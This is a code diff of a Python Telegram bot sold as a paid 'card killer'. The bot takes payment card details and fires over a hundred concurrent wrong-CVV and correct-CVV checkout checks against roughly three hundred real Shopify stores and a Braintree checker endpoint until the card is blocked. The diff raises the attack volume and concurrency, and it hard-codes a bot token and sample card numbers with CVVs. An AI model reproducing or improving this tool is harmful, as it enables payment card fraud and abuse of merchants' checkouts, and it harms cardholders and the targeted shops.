@@ -8,7 +8,6 @@ import re
 import secrets
 import aiohttp
 from datetime import datetime
-from collections import defaultdict
 
 from telegram import Update
 from telegram.constants import ParseMode
@@ -18,7 +17,7 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 TOKEN = "7679364536:AAHEwAKja_ku1CnmzP7iDlt8em8xSOPhqBE"
 OWNER_ID = 7446400377
 
-# Shopify sites (all 38 from your list)
+# All Shopify sites (merged unique list from both old and new)
 SHOPIFY_SITES = [
     "https://healthyharvest-com.myshopify.com",
     "https://hearing-milestones.myshopify.com",
@@ -58,15 +57,298 @@ SHOPIFY_SITES = [
     "https://getondown.myshopify.com",
     "https://danielkraftmann.myshopify.com",
     "https://flannel-candle-co.myshopify.com",
-    "https://woofsandmiaus.myshopify.com"
+    "https://woofsandmiaus.myshopify.com",
+    "https://demkoknives.myshopify.com",
+    "https://doctoraromas.myshopify.com",
+    "https://enjoyzibra.myshopify.com",
+    "https://collegepress.myshopify.com",
+    "https://dillidalli-eyewear.myshopify.com",
+    "https://evidence-based-birth.myshopify.com",
+    "https://cocoapink.myshopify.com",
+    "https://coral-nano-silver-toothpaste.myshopify.com",
+    "https://graymatterco.myshopify.com",
+    "https://darkaz-and-frames.myshopify.com",
+    "https://groovewasher.myshopify.com",
+    "https://experiment-beauty.myshopify.com",
+    "https://classy-cards-creative.myshopify.com",
+    "https://corsaclassic.myshopify.com",
+    "https://day-rate-beauty.myshopify.com",
+    "https://free-woman-apparel-llc.myshopify.com",
+    "https://grillblazer.myshopify.com",
+    "https://cs-io.myshopify.com",
+    "https://classic-british-spares-2.myshopify.com",
+    "https://dakotaangler.myshopify.com",
+    "https://deals-gap.myshopify.com",
+    "https://happiertogive.myshopify.com",
+    "https://gjenmi.myshopify.com",
+    "https://grocynet.myshopify.com",
+    "https://healthy-spot.myshopify.com",
+    "https://collettes-cottage.myshopify.com",
+    "https://common-good-shop.myshopify.com",
+    "https://d6a229-a5.myshopify.com",
+    "https://disegno-fine-jewellery.myshopify.com",
+    "https://earthlyadornments-com.myshopify.com",
+    "https://elanmakeupstudio.myshopify.com",
+    "https://few-of-a-kind-store.myshopify.com",
+    "https://goose-ridge-soaps-llc.myshopify.com",
+    "https://graftobian-make-up-company.myshopify.com",
+    "https://heartblood-cacao.myshopify.com",
+    "https://doggielawn.myshopify.com",
+    "https://dinowax.myshopify.com",
+    "https://hangerbee.myshopify.com",
+    "https://drury-outdoors.myshopify.com",
+    "https://frylashes.myshopify.com",
+    "https://defy-mfg-co.myshopify.com",
+    "https://colorway-arts.myshopify.com",
+    "https://door-county-candle.myshopify.com",
+    "https://dandy-lions-cosmetics.myshopify.com",
+    "https://elderlyinstruments.myshopify.com",
+    "https://discountshoptools.myshopify.com",
+    "https://granite-state-candy-shop.myshopify.com",
+    "https://clothandpaperco.myshopify.com",
+    "https://dalen-products-store.myshopify.com",
+    "https://detectorwarehouse.myshopify.com",
+    "https://divine-equestrian.myshopify.com",
+    "https://ecoestic.myshopify.com",
+    "https://contractortool.myshopify.com",
+    "https://equine-comfort-products.myshopify.com",
+    "https://grandmaslyesoap.myshopify.com",
+    "https://daxinternational.myshopify.com",
+    "https://grainvine.myshopify.com",
+    "https://dotter.myshopify.com",
+    "https://coco-and-breezy-eyewear.myshopify.com",
+    "https://chimp-haven-merch.myshopify.com",
+    "https://heartell-press.myshopify.com",
+    "https://dare2bartzy2-com.myshopify.com",
+    "https://cognitive-surplus.myshopify.com",
+    "https://deathwish.myshopify.com",
+    "https://classicautoreproductions.myshopify.com",
+    "https://cortland.myshopify.com",
+    "https://daddies-board-shop.myshopify.com",
+    "https://corpsbuckle.myshopify.com",
+    "https://climb-smart-shop.myshopify.com",
+    "https://complyfoamus.myshopify.com",
+    "https://cleclothingco.myshopify.com",
+    "https://divinity-boutique-gifts.myshopify.com",
+    "https://double-hh-thrifty.myshopify.com",
+    "https://fs2supplyco.myshopify.com",
+    "https://greek-necessities.myshopify.com",
+    "https://gregorysgraphics.myshopify.com",
+    "https://gumbeauxgators.myshopify.com",
+    "https://happysprinkles.myshopify.com",
+    "https://hartford-prints-store.myshopify.com",
+    "https://hawkwatch-international.myshopify.com",
+    "https://heather-louise-jewelry.myshopify.com",
+    "https://hamicobrush.myshopify.com",
+    "https://germblocker.myshopify.com",
+    "https://chick-from-chick-invitations.myshopify.com",
+    "https://grill-masters-club.myshopify.com",
+    "https://cutenenithings.myshopify.com",
+    "https://comfy-kiln-studio.myshopify.com",
+    "https://dura-coating-technology.myshopify.com",
+    "https://emmaonesock.myshopify.com",
+    "https://grdn.myshopify.com",
+    "https://dale-audrey-oral-fitness-inc.myshopify.com",
+    "https://delsbrix.myshopify.com",
+    "https://endurance-products-company.myshopify.com",
+    "https://gender-reveal-celebrations.myshopify.com",
+    "https://clover-baby-and-kids.myshopify.com",
+    "https://cold-moon-collective.myshopify.com",
+    "https://corgi-things.myshopify.com",
+    "https://df6892-b8.myshopify.com",
+    "https://fig-andfern.myshopify.com",
+    "https://gritomatic.myshopify.com",
+    "https://getsheetdoneplanners-com.myshopify.com",
+    "https://cristyscollection.myshopify.com",
+    "https://ec0c2a.myshopify.com",
+    "https://economy-aquatic-gardens.myshopify.com",
+    "https://cocos-variety.myshopify.com",
+    "https://crspotless.myshopify.com",
+    "https://cucucovers.myshopify.com",
+    "https://d58ecf-f0.myshopify.com",
+    "https://grayandhound.myshopify.com",
+    "https://drd-wholesale-silicone-beads.myshopify.com",
+    "https://gray-heron-blankets.myshopify.com",
+    "https://davids-toothpaste.myshopify.com",
+    "https://drkstenncans.myshopify.com",
+    "https://clivecoffee.myshopify.com",
+    "https://dudeproducts.myshopify.com",
+    "https://gifted-la.myshopify.com",
+    "https://crystalynkae.myshopify.com",
+    "https://cultneverdies.myshopify.com",
+    "https://eco-led-mart.myshopify.com",
+    "https://classic-cycling.myshopify.com",
+    "https://funnysunnylps.myshopify.com",
+    "https://gentsbarbershopspa.myshopify.com",
+    "https://habersham-candle.myshopify.com",
+    "https://combatflipflops.myshopify.com",
+    "https://delphinium-beauty-products.myshopify.com",
+    "https://edge-right.myshopify.com",
+    "https://coffee-junkie.myshopify.com",
+    "https://creative-energy-candles.myshopify.com",
+    "https://dafna-beauty.myshopify.com",
+    "https://damore-engineering.myshopify.com",
+    "https://girl-upcycled.myshopify.com",
+    "https://grey-jam-press.myshopify.com",
+    "https://dogbed4less.myshopify.com",
+    "https://gift-horse-8649.myshopify.com",
+    "https://colonial-candle.myshopify.com",
+    "https://fuckingballoons-com.myshopify.com",
+    "https://crystaldeo.myshopify.com",
+    "https://hausandgarten.myshopify.com",
+    "https://decalcomania-llc.myshopify.com",
+    "https://down-feather-co.myshopify.com",
+    "https://fast-track-usa.myshopify.com",
+    "https://green-tidings.myshopify.com",
+    "https://dapper-wise.myshopify.com",
+    "https://dropdead-design-studios.myshopify.com",
+    "https://emil-erwin.myshopify.com",
+    "https://40f919.myshopify.com",
+    "https://arcademachines-com.myshopify.com",
+    "https://anaheimfeed.myshopify.com",
+    "https://bacchus-and-barleycorn.myshopify.com",
+    "https://a038bc.myshopify.com",
+    "https://aramara-beauty.myshopify.com",
+    "https://acawso.myshopify.com",
+    "https://arrowsafetydevice.myshopify.com",
+    "https://bradley-packaging.myshopify.com",
+    "https://badukclub.myshopify.com",
+    "https://bagandtote.myshopify.com",
+    "https://blisshaus.myshopify.com",
+    "https://all-american-balloons.myshopify.com",
+    "https://bulk-tumblers.myshopify.com",
+    "https://brewcitybrand.myshopify.com",
+    "https://action-toys.myshopify.com",
+    "https://arkel-bike-bags.myshopify.com",
+    "https://big-star-lights-na.myshopify.com",
+    "https://busy-benny.myshopify.com",
+    "https://alchemy-forall.myshopify.com",
+    "https://bestpysanky.myshopify.com",
+    "https://blossomboxjewelry.myshopify.com",
+    "https://52kards.myshopify.com",
+    "https://6652aa.myshopify.com",
+    "https://acdc-mt.myshopify.com",
+    "https://arkansas-outdoor-power-equipment.myshopify.com",
+    "https://allergystore-com.myshopify.com",
+    "https://bc123b-3.myshopify.com",
+    "https://amplifycosmetics.myshopify.com",
+    "https://beezeeart.myshopify.com",
+    "https://8b90b1-4.myshopify.com",
+    "https://back-by-popular-demand-consignment-inc.myshopify.com",
+    "https://agrariaome.myshopify.com",
+    "https://ae5364.myshopify.com",
+    "https://battery-hub.myshopify.com",
+    "https://beads-to-live-by.myshopify.com",
+    "https://51d2d5-04.myshopify.com",
+    "https://688a39-2.myshopify.com",
+    "https://artboxvan.myshopify.com",
+    "https://8b88bd-2.myshopify.com",
+    "https://americanblossomlinens.myshopify.com",
+    "https://american-soft-linen.myshopify.com",
+    "https://aestheticsbykell.myshopify.com",
+    "https://beautyswab.myshopify.com",
+    "https://artistry-cards.myshopify.com",
+    "https://freshwaterconservationcanada.myshopify.com",
+    "https://getevo.myshopify.com",
+    "https://coral-cottage-boutiques.myshopify.com",
+    "https://clean-slate-goods.myshopify.com",
+    "https://d95ccc.myshopify.com",
+    "https://elastic-band-co.myshopify.com",
+    "https://d16b88-49.myshopify.com",
+    "https://douglas-sweets.myshopify.com",
+    "https://eye-of-love.myshopify.com",
+    "https://decants.myshopify.com",
+    "https://cloverscharmbar.myshopify.com",
+    "https://dimple-divot.myshopify.com",
+    "https://fuzzibunzdiapers.myshopify.com",
+    "https://e68952-0d.myshopify.com",
+    "https://divina-esencial-llc.myshopify.com",
+    "https://elegant-barber-zone.myshopify.com",
+    "https://eighth-generation.myshopify.com",
+    "https://grimblades.myshopify.com",
+    "https://cold-hose.myshopify.com",
+    "https://dream-hammock4271.myshopify.com",
+    "https://elittledirect.myshopify.com",
+    "https://clksupplies.myshopify.com",
+    "https://chique-tools.myshopify.com",
+    "https://china-synergy-group.myshopify.com",
+    "https://dalton06.myshopify.com",
+    "https://funwateroutdoor.myshopify.com",
+    "https://cuddlology.myshopify.com",
+    "https://comic-pro-line.myshopify.com",
+    "https://cora-ball.myshopify.com",
+    "https://earthpaint.myshopify.com",
+    "https://endure-industries.myshopify.com",
+    "https://dulci-sweets.myshopify.com",
+    "https://duckietown.myshopify.com",
+    "https://crownpointgraphics.myshopify.com",
+    "https://filmneverdie-com.myshopify.com",
+    "https://cooltoolsus.myshopify.com",
+    "https://d-energy.myshopify.com",
+    "https://daily-kairos.myshopify.com",
+    "https://equator-dev.myshopify.com",
+    "https://corita.myshopify.com",
+    "https://colour-streams.myshopify.com",
+    "https://ecolunchboxes.myshopify.com",
+    "https://dark-matter-coffee.myshopify.com",
+    "https://grace-girl-beads.myshopify.com",
+    "https://child-to-cherish.myshopify.com",
+    "https://contact-8801710479361.myshopify.com",
+    "https://cordee-cases.myshopify.com",
+    "https://cruzbike-com.myshopify.com",
+    "https://wild-thunder-gel-nails.myshopify.com",
+    "https://thebrokentoken.myshopify.com",
+    "https://www-ohhmygoodness-com.myshopify.com",
+    "https://a-thrifty-notion.myshopify.com",
+    "https://skonecosmetics.myshopify.com",
+    "https://sexy-sparkles-fashion-jewelry.myshopify.com",
+    "https://humdrum-paper.myshopify.com",
+    "https://crimsonandclover.myshopify.com",
+    "https://aspenkaynaturals.myshopify.com",
+    "https://art-o-fabric.myshopify.com",
+    "https://artlia-webshop.myshopify.com",
+    "https://beadsmakemehappy.myshopify.com",
+    "https://bluelandhome.myshopify.com",
+    "https://c5798e.myshopify.com",
+    "https://c8-nail-supply.myshopify.com",
+    "https://israelbookshop.myshopify.com",
+    "https://ignik-outdoors.myshopify.com",
+    "https://iring-com.myshopify.com",
+    "https://innovativeconcrete.myshopify.com",
+    "https://idea-studio-lagrange-il.myshopify.com",
+    "https://knours-us.myshopify.com",
+    "https://missy-mae-tutus.myshopify.com",
+    "https://merci-handy-us.myshopify.com",
+    "https://mikey-and-mia.myshopify.com",
+    "https://militaryoverstock.myshopify.com",
+    "https://one-condoms.myshopify.com",
+    "https://the-pet-glider.myshopify.com",
+    "https://third-lennox-flowers.myshopify.com",
+    "https://viridiangaming.myshopify.com",
+    "https://widgetco-inc.myshopify.com",
+    "https://yourthreads.myshopify.com",
+    "https://yearpins.myshopify.com",
+    "https://panicfabrications.com",
+    "https://awesome-store-h7366.myshopify.com",
+    "https://bambinosbabyfood.myshopify.com",
+    "https://chicologyinc.myshopify.com",
+    "https://doctorqs.myshopify.com",
+    "https://grandma-lucys.myshopify.com",
+    "https://louveredroofkit.myshopify.com",
+    "https://ozark-compost-swap.myshopify.com",
+    "https://onofriends.myshopify.com",
+    "https://ultrapress.myshopify.com",
+    "https://underdog-brand.myshopify.com",
+    "https://zefiro-chicago.myshopify.com",
 ]
+
 SHOPIFY_API_URL = "https://web-production-b4ec9.up.railway.app/shopify"
 BRAINTREE_API1 = "https://braintree-charged.onrender.com/braintree"
 
-# Concurrency – cranked up for speed
-SHOPIFY_CONCURRENCY = 40
+# Concurrency
+SHOPIFY_CONCURRENCY = 50   # increased to handle 100 requests quickly
 BRAINTREE_CONCURRENCY = 5
-REQUEST_TIMEOUT = 10  # seconds
+REQUEST_TIMEOUT = 10
 
 # Files
 DATA_FILE = "user_data.json"
@@ -175,7 +457,7 @@ def redeem_code(code, user_id):
     add_credits(user_id, credits)
     return True, credits
 
-# ================= API CALLS (SHARED SESSION) =================
+# ================= API CALLS =================
 async def report_error_to_owner(context, api_name, error_msg, card_str=""):
     if OWNER_ID:
         await context.bot.send_message(
@@ -184,17 +466,14 @@ async def report_error_to_owner(context, api_name, error_msg, card_str=""):
             parse_mode=ParseMode.MARKDOWN
         )
 
-# Shared session (created once per kill sequence)
 class SharedSession:
     def __init__(self):
         self.session = None
-
     async def get_session(self):
         if self.session is None:
             timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
             self.session = aiohttp.ClientSession(timeout=timeout)
         return self.session
-
     async def close(self):
         if self.session:
             await self.session.close()
@@ -238,7 +517,7 @@ async def check_braintree(session, card_str, context):
             await report_error_to_owner(context, "Braintree API", str(e), card_str)
         return False, f"Error: {str(e)[:50]}"
 
-# ================= KILL SEQUENCE (FULL CONCURRENT) =================
+# ================= KILL SEQUENCE =================
 async def perform_full_kill(card_str, original_cvv, context):
     start_time = time.time()
     shared = SharedSession()
@@ -248,9 +527,9 @@ async def perform_full_kill(card_str, original_cvv, context):
     last_shopify_resp = ""
     last_braintree_resp = ""
 
-    # 1. 20 wrong‑CVV Shopify checks (concurrent, each on random site)
+    # 1. 30 wrong CVV Shopify checks
     wrong_tasks = []
-    for _ in range(20):
+    for _ in range(30):
         wrong_cvv = random.randint(1, 999)
         while wrong_cvv == int(original_cvv):
             wrong_cvv = random.randint(1, 999)
@@ -262,9 +541,9 @@ async def perform_full_kill(card_str, original_cvv, context):
         if dead:
             any_dead = True
 
-    # 2. 40 correct‑CVV Shopify checks (concurrent)
+    # 2. 70 correct CVV Shopify checks
     correct_tasks = []
-    for _ in range(40):
+    for _ in range(70):
         site = random.choice(SHOPIFY_SITES)
         correct_tasks.append(check_shopify(session, card_str, False, None, context, site))
     correct_results = await asyncio.gather(*correct_tasks)
@@ -273,7 +552,7 @@ async def perform_full_kill(card_str, original_cvv, context):
         if dead:
             any_dead = True
 
-    # 3. 15 Braintree checks (concurrent)
+    # 3. 15 Braintree checks
     bt_tasks = [check_braintree(session, card_str, context) for _ in range(15)]
     bt_results = await asyncio.gather(*bt_tasks)
     for dead, resp in bt_results:
@@ -283,13 +562,13 @@ async def perform_full_kill(card_str, original_cvv, context):
 
     await shared.close()
     total_time = time.time() - start_time
-    total_attempts = 20 + 40 + 15  # 75
+    total_attempts = 30 + 70 + 15  # 115
     return any_dead, total_attempts, last_shopify_resp, last_braintree_resp, total_time
 
-# ================= PARSE CARD FROM FREE TEXT =================
+# ================= PARSE CARD =================
 def extract_card_details(text):
     text = text.replace('\n', ' ').replace(',', ' ')
-    # Direct pipe format
+    # Pipe format
     if '|' in text:
         parts = text.split('|')
         if len(parts) >= 4:
@@ -352,11 +631,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"[⌬] Yᴏᴜʀ Pʟᴀɴ: {plan_text}\n"
         f"[⌬] Expires: `{expiry_str}`\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"[⌬] PREMIUM COMMANDS\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"[⌬] CARDS KILLER (5 ᴄʀᴇᴅɪᴛs/ᴜsᴇ)\n"
         f"────────────────────\n"
-        f"/ko     - Kɪʟʟᴇʀ - Fᴀsᴛ Vᴇʀsɪᴏɴ (75 attempts, <10s)\n"
+        f"/ko     - Kɪʟʟᴇʀ - 100 Shopify + 15 Braintree (115 total, <12s)\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"Use `/redeem <code>` to add credits.\n"
         f"Admin commands: `/key`, `/addadmin`, `/removeadmin`, `/plan`\n"
@@ -369,25 +646,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def plan_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"[⌤] Plan 1 (1 Day)\n"
-        f"   [⌥] Days: 1\n"
-        f"   [⌥] Credits: 120\n"
-        f"   [↯] Price: Contact admin\n\n"
-        f"[⌤] Plan 2 (7 Days)\n"
-        f"   [⌥] Days: 7\n"
-        f"   [⌥] Credits: 470\n"
-        f"   [↯] Price: Contact admin\n\n"
-        f"[⌤] Plan 3 (15 Days)\n"
-        f"   [⌥] Days: 15\n"
-        f"   [⌥] Credits: 1020\n"
-        f"   [↯] Price: Contact admin\n\n"
-        f"[⌤] Plan 4 (30 Days)\n"
-        f"   [⌥] Days: 30\n"
-        f"   [⌥] Credits: 2500\n"
-        f"   [↯] Price: Contact admin\n"
+        f"[⌤] Plan 1 (1 Day) → 120 credits\n"
+        f"[⌤] Plan 2 (7 Days) → 470 credits\n"
+        f"[⌤] Plan 3 (15 Days) → 1020 credits\n"
+        f"[⌤] Plan 4 (30 Days) → 2500 credits\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"[↯] To purchase a plan, contact the admin.\n"
-        f"[⌥] Use `/redeem code` to redeem plan codes\n"
+        f"Contact admin to purchase."
     )
     await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
 
@@ -396,8 +660,7 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
     credits = get_credits(user_id)
     if credits < 5:
         await update.message.reply_text(
-            "❌ *Insufficient credits!* You need 5 credits per kill.\n"
-            "Redeem a code with `/redeem <code>` or buy a plan via `/plan`.",
+            "❌ *Insufficient credits!* Need 5 credits per kill.\nUse `/redeem` or `/plan`.",
             parse_mode=ParseMode.MARKDOWN
         )
         return
@@ -412,11 +675,7 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if not full_text:
         await update.message.reply_text(
-            "❌ Usage: `/ko <card details in any format>`\n"
-            "Examples:\n"
-            "`/ko 4147400394606212|520|07|2028`\n"
-            "`/ko Card Number: 4147400394606212 CVV: 520 Expiry: 07/2028`\n"
-            "`/ko 4403934251160201 517 01 2027`",
+            "❌ Usage: `/ko <card details>`\nExamples:\n`/ko 4147400394606212|520|07|2028`\n`/ko Card Number: 4147400394606212 CVV: 520 Expiry: 07/2028`",
             parse_mode=ParseMode.MARKDOWN
         )
         return
@@ -424,10 +683,7 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
     extracted = extract_card_details(full_text)
     if not extracted:
         await update.message.reply_text(
-            "❌ Could not extract card details. Please provide at least:\n"
-            "- Card number (16 digits)\n"
-            "- CVV (3-4 digits)\n"
-            "- Expiry (MM/YY or MM/YYYY)",
+            "❌ Could not extract card details. Need card number, CVV, expiry.",
             parse_mode=ParseMode.MARKDOWN
         )
         return
@@ -435,21 +691,24 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
     card, month, year, cvv = extracted
     card_str = f"{card}|{month}|{year}|{cvv}"
 
-    processing = await update.message.reply_text("𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴… ⏳\n(75 concurrent attempts – please wait)", parse_mode=ParseMode.MARKDOWN)
+    processing = await update.message.reply_text(
+        "𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴… ⏳\n(115 concurrent attempts – please wait)", 
+        parse_mode=ParseMode.MARKDOWN
+    )
 
-    killed, attempts, shopify_resp, braintree_resp, elapsed = await perform_full_kill(card_str, cvv, context)
+    killed, attempts, shop_resp, bt_resp, elapsed = await perform_full_kill(card_str, cvv, context)
 
     if killed:
         deduct_credits(user_id, 5)
         new_balance = get_credits(user_id)
-        result_text = (
+        result = (
             f"┏━━━━━━━⍟\n"
-            f"┃ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈 \n"
+            f"┃ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈\n"
             f"┗━━━━━━━━━━━⊛\n\n"
             f"[⌬] Cᴀʀᴅ↬ `{card_str}`\n"
-            f"[⌬] Gᴀᴛᴇᴡᴀʏ↬ Kɪʟʟᴇʀ \n"
+            f"[⌬] Gᴀᴛᴇᴡᴀʏ↬ Kɪʟʟᴇʀ\n"
             f"[⌬] Rᴇsᴘᴏɴsᴇ↬ Kɪʟʟᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ 😈\n"
-            f"[⌬] Pʀᴏᴄᴇssᴇᴅ↬ {attempts} Tɪᴍᴇs \n"
+            f"[⌬] Pʀᴏᴄᴇssᴇᴅ↬ {attempts} Tɪᴍᴇs\n"
             f"[⌬] Tɪᴍᴇ Tᴀᴋᴇɴ↣ {elapsed:.2f} Sᴇᴄᴏɴᴅs\n"
             f"━━━━━━━━━━━━━━━━━\n"
             f"[⌬] Rᴇǫᴜᴇsᴛ Bʏ↬ {update.effective_user.first_name}\n"
@@ -458,28 +717,26 @@ async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"• Cʀᴇᴅɪᴛs Dᴇᴅᴜᴄᴛᴇᴅ - 5 | Bᴀʟᴀɴᴄᴇ - {new_balance}"
         )
     else:
-        result_text = (
-            f"❌ *Kill failed!* No dead response from any gateway.\n"
+        result = (
+            f"❌ *Kill failed!* No dead response.\n"
             f"Processed: {attempts} Times | Time: {elapsed:.2f}s\n"
-            f"Last Shopify: `{shopify_resp[:80]}`\n"
-            f"Last Braintree: `{braintree_resp[:80]}`\n"
+            f"Last Shopify: `{shop_resp[:80]}`\n"
+            f"Last Braintree: `{bt_resp[:80]}`\n"
             f"*No credits deducted.*"
         )
     await processing.delete()
-    await update.message.reply_text(result_text, parse_mode=ParseMode.MARKDOWN)
+    await update.message.reply_text(result, parse_mode=ParseMode.MARKDOWN)
 
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
     args = context.args
     if not args:
         await update.message.reply_text("Usage: `/redeem <code>`", parse_mode=ParseMode.MARKDOWN)
         return
-    code = args[0]
-    success, credits = redeem_code(code, user_id)
+    success, credits = redeem_code(args[0], update.effective_user.id)
     if success:
-        await update.message.reply_text(f"✅ Redeemed! You received `{credits}` credits.", parse_mode=ParseMode.MARKDOWN)
+        await update.message.reply_text(f"✅ Redeemed `{credits}` credits.", parse_mode=ParseMode.MARKDOWN)
     else:
-        await update.message.reply_text("❌ Invalid or already used code.", parse_mode=ParseMode.MARKDOWN)
+        await update.message.reply_text("❌ Invalid or used code.", parse_mode=ParseMode.MARKDOWN)
 
 async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
@@ -487,18 +744,16 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     args = context.args
     if len(args) != 2:
-        await update.message.reply_text("Usage: `/key <quantity> <credits>`\nExample: `/key 5 100`", parse_mode=ParseMode.MARKDOWN)
+        await update.message.reply_text("Usage: `/key <quantity> <credits>`", parse_mode=ParseMode.MARKDOWN)
         return
     try:
-        quantity = int(args[0])
-        credits_val = int(args[1])
-        if quantity <= 0 or credits_val <= 0:
-            raise ValueError
+        qty, val = int(args[0]), int(args[1])
+        if qty <= 0 or val <= 0: raise ValueError
     except:
         await update.message.reply_text("Invalid numbers.", parse_mode=ParseMode.MARKDOWN)
         return
-    codes = [generate_code(credits_val) for _ in range(quantity)]
-    await update.message.reply_text(f"✅ Generated {quantity} code(s) worth {credits_val} credits each:\n`" + "\n".join(codes) + "`", parse_mode=ParseMode.MARKDOWN)
+    codes = [generate_code(val) for _ in range(qty)]
+    await update.message.reply_text(f"✅ Generated {qty} codes worth {val} credits:\n`" + "\n".join(codes) + "`", parse_mode=ParseMode.MARKDOWN)
 
 async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
@@ -510,11 +765,10 @@ async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     try:
         target = int(args[0])
+        add_admin(target)
+        await update.message.reply_text(f"✅ User `{target}` is now admin.", parse_mode=ParseMode.MARKDOWN)
     except:
         await update.message.reply_text("Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
-        return
-    add_admin(target)
-    await update.message.reply_text(f"✅ User `{target}` is now an admin.", parse_mode=ParseMode.MARKDOWN)
 
 async def removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
@@ -526,13 +780,12 @@ async def removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     try:
         target = int(args[0])
+        if remove_admin(target):
+            await update.message.reply_text(f"✅ User `{target}` is no longer admin.", parse_mode=ParseMode.MARKDOWN)
+        else:
+            await update.message.reply_text(f"❌ User `{target}` was not admin.", parse_mode=ParseMode.MARKDOWN)
     except:
         await update.message.reply_text("Invalid user ID.", parse_mode=ParseMode.MARKDOWN)
-        return
-    if remove_admin(target):
-        await update.message.reply_text(f"✅ User `{target}` is no longer an admin.", parse_mode=ParseMode.MARKDOWN)
-    else:
-        await update.message.reply_text(f"❌ User `{target}` was not an admin.", parse_mode=ParseMode.MARKDOWN)
 
 async def plan_assign(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id):
@@ -540,23 +793,18 @@ async def plan_assign(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     args = context.args
     if len(args) != 2:
-        await update.message.reply_text("Usage: `/plan <plan_id> <user_id>`\nPlan IDs: 1,2,3,4", parse_mode=ParseMode.MARKDOWN)
+        await update.message.reply_text("Usage: `/plan <plan_id> <user_id>` (1-4)", parse_mode=ParseMode.MARKDOWN)
         return
     try:
         plan_id = int(args[0])
         target = int(args[1])
         if plan_id not in PLANS:
             raise ValueError
+        assign_plan(target, plan_id)
+        plan = PLANS[plan_id]
+        await update.message.reply_text(f"✅ Plan {plan_id} assigned to `{target}`: {plan['days']} days, {plan['credits']} credits.", parse_mode=ParseMode.MARKDOWN)
     except:
         await update.message.reply_text("Invalid plan ID (1-4) or user ID.", parse_mode=ParseMode.MARKDOWN)
-        return
-    assign_plan(target, plan_id)
-    plan = PLANS[plan_id]
-    await update.message.reply_text(
-        f"✅ Plan {plan_id} assigned to user `{target}`.\n"
-        f"Days: {plan['days']} | Credits: {plan['credits']}",
-        parse_mode=ParseMode.MARKDOWN
-    )
 
 # ================= MAIN =================
 def main():
@@ -569,7 +817,7 @@ def main():
     app.add_handler(CommandHandler("addadmin", addadmin))
     app.add_handler(CommandHandler("removeadmin", removeadmin))
     app.add_handler(CommandHandler("plan", plan_assign))
-    print("🔥 Ultra‑fast concurrent killer bot is running...")
+    print("🔥 Fast killer bot ready: 100 Shopify + 15 Braintree (115 total, <12s)")
     print(f"👑 Owner ID: {OWNER_ID}")
     app.run_polling()
 
